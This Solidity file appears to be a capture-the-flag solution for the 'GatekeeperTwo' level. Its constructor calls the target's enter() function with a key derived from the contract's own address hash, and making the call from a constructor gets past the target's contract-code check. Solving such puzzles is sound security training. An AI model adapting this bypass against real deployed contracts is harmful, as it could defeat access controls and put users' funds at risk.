// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./interfaces/14_IGatekeeperTwo.sol";

address constant INSTANCE = 0x63F15924Fd5131bd8cD826D9c2eBeCF39Df3fa5A;

contract GatekeeperTwoSolution {
    IGatekeeperTwo instance = IGatekeeperTwo(INSTANCE);

    constructor() {
        instance.enter(bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(this))))));
    }
}